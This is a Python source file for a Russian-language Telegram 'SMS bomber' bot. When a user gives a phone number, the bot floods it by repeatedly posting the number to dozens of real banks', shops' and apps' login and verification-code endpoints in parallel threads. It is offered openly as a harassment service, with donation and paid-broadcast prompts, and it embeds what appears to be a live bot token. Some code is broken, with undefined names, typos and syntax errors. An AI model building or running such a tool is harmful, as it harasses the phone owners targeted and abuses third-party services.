 # coding=utf8
import requests
import threading
from datetime import datetime, timedelta
from telebot import TeleBot
import telebot
import time


# Нужно вписать токет своего бота.
TOKEN = '772006356:AAGX_VubxlywRZLzRpU1GBKFKy8DTTZ653I'

# Можно уменьшить количество потоков-исполнителем этой переменной. Не знаю возможности системы так что ставлю 20
THREADS_LIMIT = 400

chat_ids_file = 'chat_ids.txt'

# Нужно вписать айди админского чата
ADMIN_CHAT_ID = 998991611

# Эти переменные лучше не менять
users_amount = [0]
threads = list()
THREADS_AMOUNT = [0]
types = telebot.types
bot = TeleBot(TOKEN)
running_spams_per_chat_id = []


def save_chat_id(chat_id):
    "Функция добавляет чат айди в файл если его там нету"
    chat_id = str(chat_id)
    with open(chat_ids_file,"a+") as ids_file:
        ids_file.seek(0)

        ids_list = [line.split('\n')[0] for line in ids_file]

        if chat_id not in ids_list:
            ids_file.write(f'{chat_id}\n')
            ids_list.append(chat_id)
            print(f'New chat_id saved: {chat_id}')
        else:
            print(f'chat_id {chat_id} is already saved')
        users_amount[0] = len(ids_list)
    return


def send_message_users(message):

    def send_message(chat_id):
        data = {
            'chat_id': chat_id,
            'text': message
        }
        response = requests.post(f'https://api.telegram.org/bot{TOKEN}/sendMessage', data=data)

    with open(chat_ids_file, "r") as ids_file:
        ids_list = [line.split('\n')[0] for line in ids_file]

    [send_message(chat_id) for chat_id in ids_list]


@bot.message_handler(commands=['start'])
def start(message):
    keyboard = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    boom = types.KeyboardButton(text='🔥💣БОМБЕР')
    stop = types.KeyboardButton(text='Стоп Спам')
    info = types.KeyboardButton(text='ℹ️Информация')
    stats = types.KeyboardButton(text='📈Статистика')
    donat = types.KeyboardButton(text='💰Поддержать')
    piar = types.KeyboardButton(text='💸 Реклама')
    faq = types.KeyboardButton(text='FAQ / Соглашение')

    buttons_to_add = [boom, stop, info, stats, donat, piar, faq]

    if int(message.chat.id) == ADMIN_CHAT_ID:
        buttons_to_add.append(types.KeyboardButton(text='Рассылка'))

    keyboard.add(*buttons_to_add)
    bot.send_message(message.chat.id, 'Добро пожаловать🙋‍♂!\nВыберите действие:',  reply_markup=keyboard)
    save_chat_id(message.chat.id)


def send_for_number(phone):
        request_timeout = 0.00001
        try:
            requests.post('https://mcdonalds.ru/api/auth/code', json={'phone': '+' + _phone})
        except Exception as e:
            pass
        except Exception as e:
            pass
        try:
            requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': self.formatted_phone})
        except Exception as e:
            pass
        try:
            requsets.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php',
                          data={'name': self.sms_text, 'phone': self.formatted_phone})
        except Exception as e:
            pass
        try:
            requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',
                              params={'pageName': 'registerPrivateUserPhoneVerification'}, data={'phone': phone})
        except Exception as e:
            pass
        try:
            requests.post('https://api-ru-manage.voximplant.com/api/AddAccount',data={'region': 'eu', 'account_name': _name, 'language_code': 'en','account_email': _name + '@gmail.com', 'account_password': _name})
        except Exception as e:
            pass
        try:
            requests.get('https://oapi.raiffeisen.ru/api/sms-auth/public/v1.0/phone/code', params={'number':_phone})
        except Exception as e:
            pass
        try:
            requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
        except Exception as e:
            pass
        try:
            requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+'+_phone})
        except Exception as e:
            pass
        try:
            requests.post('https://www.citilink.ru/registration/confirm/phone/+'+_phone+'/')
        except Exception as e:
            pass
        try:
            requests.get(' https://findclone.ru/register?phone=+'+_phone, params={'phone': '+'+_phone})
        except Exception as e:
            pass
        try:
            requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php', data={'name': _name,'phone': _phone, 'promo': 'yellowforma'})
        except Exception as e:
            pass
        try:
            requests.post('https://lenta.com/api/v1/authentication/requestValidationCode', json={'phone': '+' + _phone})
        except Exception as e:
            pass
        try:
            requests.get('https://www.oyorooms.com/api/pwa/generateotp?phone='+_phone9+'&country_code=%2B7&nod=4&locale=en')
        except Exception as e:
            pass
        try:
            requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp', params={'pageName': 'loginByUserPhoneVerification', 'fromCheckout': 'false','fromRegisterPage': 'true','snLogin': '','bpg': '','snProviderId': ''}, data={'phone': '+7 915 3509908','g-recaptcha-response': '','recaptcha': 'on'})
        except Exception as e:
            pass
        try:
            requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': _phone,'typeKeys': ['Unemployed']}},'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
        except Exception as e:
            pass
        try:
            requests.get('https://www.s7.ru/dotCMS/priority/ajaxEnrollment',params={'dispatch': 'shortEnrollmentByPhone', 'mobilePhone.countryCode': '7','mobilePhone.areaCode': _phone[1:4], 'mobilePhone.localNumber': _phone[4:-1]})
        except Exception as e:
            pass
        try:
            requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
        except Exception as e:
            pass
        try:
            requests.post('https://gorzdrav.org/login/register/sms/send', data={'phone': _phoneGorzdrav, 'CSRFToken': '*'})	
        except Exception as e:
            pass
        try:
            requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
        except Exception as e:
            pass
        try:
            requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest', json={'firstName':'Иван','middleName':'Иванович','lastName':'Иванов','sex':'1','birthDate':'10.10.2000','mobilePhone': _phone9,'russianFederationResident':'true','isDSA':'false','personalDataProcessingAgreement':'true','bKIRequestAgreement':'null','promotionAgreement':'true'})
        except Exception as e:
            pass
        try:
            requests.post('https://online.sbis.ru/reg/service/', json={'jsonrpc':'2.0','protocol':'5','method':'Пользователь.ЗаявкаНаФизика','params':{'phone':_phone},'id':'1'})
        except Exception as e:
            pass
        try:
            requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
        except Exception as e:
            pass
        try:
            requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/', json={'client_type': 'personal', 'email': _email, 'mobile_phone': _phone, 'deliveryOption': 'sms'})
        except Exception as e:
            pass
        try:
            requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': _phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})  
        except Exception as e:
            pass
        try:
            requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone}).json()[]
        except Exception as e:
            pass
        try:
            requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={})
        except Exception as e:
            pass
        try:
            requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+'+_phone}, headers={})
        except Exception as e:
            pass
        try:
            requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
        except Exception as e:
            pass
        try:
            requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
        except Exception as e:
            pass
        try:
            requests.post('https://pizzahut.ru/account/password-reset', data={'reset_by':'phone', 'action_id':'pass-recovery', 'phone': _phonePizzahut, '_token':'*'})
        except Exception as e:
            pass
        try:
            requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
        except Exception as e:
            pass

        try:
            requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': phone})
        except Exception as e:
            pass

        try:   
            requests.post('https://www.citilink.ru/registration/confirm/phone/+' + phone + '/')
        except Exception as e:
            pass

        try:  
            requests.post('https://online-api.dozarplati.com/rpc', json={'id': 1, 'jsonrpc': '2.0', 'method': 'auth.login', 'params': {'phoneNumber': phone}})
        except Exception as e:
            pass

        try:
            requests.post('https://lenta.com/api/v1/authentication/requestValidationCode', json={'phone': '+' + phone})
        except Exception as e:
            pass                                              

        try:    
            requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {
                                        'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': phone,
                                                       'typeKeys': ['Unemployed']}},
                                                                                              'query': 'mutation registration($client: ClientInput!) {'
                                                                                                       '\n  registration(client: $client) {'
                                                                                                       '\n    token\n    __typename\n  }\n}\n'})
        except Exception as e:
            pass

        try:    
            requests.get('https://api.pswallet.ru/system/smsCode', params={'mobile': phone, 'type': '0'})
        except Exception as e:
            pass
        try:
            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': phone}, headers={})
        except Exception as e:
            pass

        try:    
            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': phone})
        except Exception as e:
            pass
        try:    
            requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': phone}, headers={'App-ID': 'cabinet'}) 
        except Exception as e:
            pass

        try:                                                
            requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+' + phone})
        except Exception as e:
            pass
        try:
            requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data = {'phoneNumber':phone, 'countryCode':'ID','name':'Alexey','email':'alexey173949@gmail.com', 'deviceToken':'*'}, headers = {'User-Agent':'Mozilla/5.0 (X11;                     Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0'})
        except Exception as e:
            pass

        try:
            a=requests.get('https://driver.gett.ru/signup/')
            requests.post('https://driver.gett.ru/api/login/phone/', data = {'phone':phone,'registration':'true'}, headers = {'Accept-Encoding':'gzip, deflate, br','Accept-Language':'en-US,en;q=0.5','Connection':'keep-alive','Cookie':'csrftoken='+a.cookies['csrftoken']+'; _ym_uid=1547234164718090157; _ym_d=1547234164; _ga=GA1.2.2109386105.1547234165; _ym_visorc_46241784=w; _gid=GA1.2.1423572947.1548099517; _gat_gtag_UA_107450310_1=1; _ym_isad=2','Host':'driver.gett.ru','Referer':'https://driver.gett.ru/signup/','User-Agent':'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0','X-CSRFToken':a.cookies['csrftoken']})
        except Exception as e:
            pass

        try:    
            requests.post('https://api-production.viasat.ru/api/v1/auth_codes', data = {'msisdn':phone}, headers = {'Accept-Encoding':'gzip, deflate, br','Accept-Language':'ru','Connection':'keep-alive','Host':'api-production.viasat.ru','Origin':'https://vipplay.ru','Referer':'https://vipplay.ru/','User-Agent':'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0','X-Requested-With':'XMLHttpRequest'})
        except Exception as e:
            pass

        try:
            requests.post('https://www.maxidom.ru/ajax/doRegister.php?RND=0.6416262061536506',data = {:phone,},headers = {'Accept-Language':'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3', 'Connection':'keep-alive', 'Host':'www.maxidom.ru', 'origin':'https://www.maxidom.ru/','Referer':'https://www.maxidom.ru/ajax/doRegister.php?RND=0.6416262061536506'})
        except Exception as e:
            pass


        try:
            requests.post('https://youla.ru/web-api/auth/request_code',data = {:phone},headers = {'Accept-Language':'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3', 'Connection':'keep-alive', 'Host':'youla.ru', 'origin':'https://youla.ru','Referer':'https://youla.ru/surgut'})
        except Exception as e:
            pass

        try:    
            requests.post('https://beta.delivery-club.ru/api/user/otp',data = {:phone},headers = {'Accept-Language':'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3', 'Connection':'keep-alive', 'Host':'beta.delivery-club.ru', 'origin':'https://beta.delivery-club.ru','Referer':'https://beta.delivery-club.ru/entities/food?authPopupOpened=1'})
        except Exception as e:
            pass

        try:    
            requests.post('https://api.sunlight.net/v3/customers/authorization/',data = {:phone},headers = {'Accept-Language':'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3', 'Connection':'keep-alive', 'Host':'api.sunlight.net', 'origin':'https://sunlight.net/','Referer':'https://sunlight.net/profile/login/?next=/profile/'})
        except Exception as e:
            pass

        try:    
            requests.post('https://register.sipnet.ru/cgi-bin/exchange.dll/RegisterHelper?oper=9&phone=79821432646',data = {"phone":phone,"oper":"9"},headers = {'Accept-Language':'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3', 'Connection':'keep-alive', 'Host':'register.sipnet.ru', 'origin':'https://www.sipnet.ru/','Referer':'https://www.sipnet.ru/tarify-ip-telefonii'})
        except Exception as e:
            pass

        try:    
            requests.post('https://api.ivi.ru/mobileapi/user/register/phone/v6/',data = {:phone},headers = {'Accept-Language':'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3', 'Connection':'keep-alive', 'Host':'api.ivi.ru', 'origin':'https://www.ivi.ru/','Referer':'https://www.ivi.ru/profile'})
        except Exception as e:
            pass

        try:    
            requests.post('https://koronapay.com/transfers/online/api/users/otps',data = {:phone},headers = {'Accept-Language':'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3', 'Connection':'keep-alive', 'Host':'koronapay.com', 'origin':'https://koronapay.com','Referer':'https://koronapay.com/transfers/online/login'})
        except Exception as e:
            pass

        try:
            b = requests.session()
            b.get('https://drugvokrug.ru/siteActions/processSms.htm')
            requests.post('https://drugvokrug.ru/siteActions/processSms.htm', data = {'cell':phone}, headers = {'Accept-Language':'en-US,en;q=0.5','Connection':'keep-alive','Cookie':'JSESSIONID='+b.cookies['JSESSIONID']+';','Host':'drugvokrug.ru','Referer':'https://drugvokrug.ru/','User-Agent':'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0','X-Requested-With':'XMLHttpRequest'})
        except Exception as e:
            pass

        try:
            requests.post('https://api-production.viasat.ru/api/v1/auth_codes', data = {'msisdn':phone}, headers = {'Accept-Encoding':'gzip, deflate, br','Accept-Language':'ru','Connection':'keep-alive','Host':'api-production.viasat.ru','Origin':'https://vipplay.ru','Referer':'https://vipplay.ru/','User-Agent':'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0','X-Requested-With':'XMLHttpRequest'}) 
        except Exception as e:
            pass

        try:
            requests.post('https://b.utair.ru/api/v1/login/', data = {'login':phone}, headers = {'Accept-Encoding':'gzip, deflate, br','Accept-Language':'en-US,en;q=0.5','Connection':'keep-alive','Host':'b.utair.ru','origin':'https://www.utair.ru','Referer':'https://www.utair.ru/'})
        except Exception as e:
            pass

        try:
            requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data = {'phoneNumber':phone, 'countryCode':'ID','name':'Alexey','email':'alexey173949@gmail.com', 'deviceToken':'*'}, headers = {'User-Agent':'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0'})
        except Exception as e:
            pass



def start_spam(chat_id, phone_number, force):
    running_spams_per_chat_id.append(chat_id)

    if force:
        msg = f'Спам запущен на неограниченое время для номера +{phone_number}'
    else:
         msg = f'Спам запущен на 20 минут на номер +{phone_number}'

    bot.send_message(chat_id, msg)
    end = datetime.now() + timedelta(minutes = 20)
    while (datetime.now() < end) or (force and chat_id==ADMIN_CHAT_ID):
        if chat_id not in running_spams_per_chat_id:
            break
        send_for_number(phone_number)
    bot.send_message(chat_id, f'Спам на номер {phone_number} завершён')
    THREADS_AMOUNT[0] -= 1 # стояло 1
    try:
        running_spams_per_cзнhat_id.remove(chat_id)
    except Exception:
        pass


def spam_handler(phone, chat_id, force):
    if int(chat_id) in running_spams_per_chat_id:
        bot.send_message(chat_id, 'Вы уже начали рассылку спама. Дождитесь окончания или нажмите Стоп Спам и поробуйте снова')
        return

    # Если количество тредов меньше максимального создается новый который занимается спамом
    if THREADS_AMOUNT[0] < THREADS_LIMIT:
        x = threading.Thread(target=start_spam, args=(chat_id, phone, force))
        threads.append(x)
        THREADS_AMOUNT[0] += 1
        x.start()
    else:
        bot.send_message(chat_id, 'Сервера сейчас перегружены. Попытайтесь снова через несколько минут')
        print('Максимальное количество тредов исполняется. Действие отменено.')


@bot.message_handler(content_types=['text'])
def handle_message_received(message):
    chat_id = int(message.chat.id)
    text = message.text

    if text == 'ℹ️Информация':
        bot.send_message(chat_id, 'Создатель бота: @ATrild\nПо вопросам сотрудничества обращаться в ЛС к создателю бота')

    elif text == '🔥💣БОМБЕР':
        bot.send_message(chat_id, 'Введите номер без + в формате:\n🇺🇦 380xxxxxxxxx\n🇷🇺 79xxxxxxxxx')

    elif text == '📈Статистика':
        bot.send_message(chat_id, f'📊Статистика отображается в реальном времени📡!\nПользователей🙎‍♂: {users_amount[0]}\nСервисов для RU🇷🇺: 300\nСервисов для UK🇺🇦: 51\nБот запущен: 12.06.2019')

    elif text == '💰Поддержать':
        bot.send_message(chat_id, 'Ребята, кто может материально помочь на развитие бота\nВот реквизиты\nQIWI ATrild')
    
    elif text == '💸 Реклама':
        bot.send_message(chat_id, 'В Нашем Боте 1 рассылка стоит  100 рублей\nЕе получат все пользователи бота\nПо вопросам покупки писать @ATrild')    

    elif text == 'Рассылка' and chat_id==ADMIN_CHAT_ID:
        bot.send_message(chat_id, 'Введите сообщение в формате: "РАЗОСЛАТЬ: ваш_текст" без кавычек')

    elif text == 'FAQ / Соглашение':
        bot.send_message(chat_id, '"Andromeda" предлагается Вашему вниманию при условии Вашего полного согласия со всеми правилами. При доступе или использовании данного сервиса каким-либо образом Вы даете согласие действовать в рамках Пользовательского соглашения\nПОЛЬЗОВАТЕЛЬСКОЕ СОГЛАШЕНИЕ\n1.Настоящее Пользовательское соглашение (далее – Соглашение) относится к сервису информационно-развлекательного ресурса "Andromeda"\n2.Доступ к сервису предоставляется на бесплатной основе.\n3."Andromeda" сервис предназначен исключительно для развлекательных целей.\n4.На Администрацию сервиса не возлагается каких-либо обязательств перед пользователями.\n5.Администрация сайта не принимает встречные предложения от Пользователей относительно изменений настоящего Пользовательского соглашения.\n6.Администрация сервиса "Andromeda" Не несет ответственности за причиненный ущерб третьим лицам попавших под влияние сервиса.\nСпасибо за внимание!')

    
    elif text == 'Стоп Спам':
        if chat_id not in running_spams_per_chat_id:
            bot.send_message(chat_id, 'Вы еще не начинали спам')
        else:
            running_spams_per_chat_id.remove(chat_id)

    elif 'РАЗОСЛАТЬ: ' in text and chat_id==ADMIN_CHAT_ID:
        msg = text.replace("РАЗОСЛАТЬ: ","")
        send_message_users(msg)

    elif len(text) == 11:
        phone = text
        spam_handler(phone, chat_id, force=False)


    elif len(text) == 12:
        phone = text
        spam_handler(phone, chat_id, force=False)



    elif len(text) == 12 and chat_id==ADMIN_CHAT_ID and text[0]=='_':
        phone = text[1:]
        spam_handler(phone, chat_id, force=True)

    else:
        bot.send_message(chat_id, f'Номер введен неправильно. Введено {len(text)} символов, ожидается 11')
        print(f'Номер введен неправильно. Введено {len(text)} символов, ожидается 11')

if __name__ == '__main__':
    bot.polling(none_stop=True)
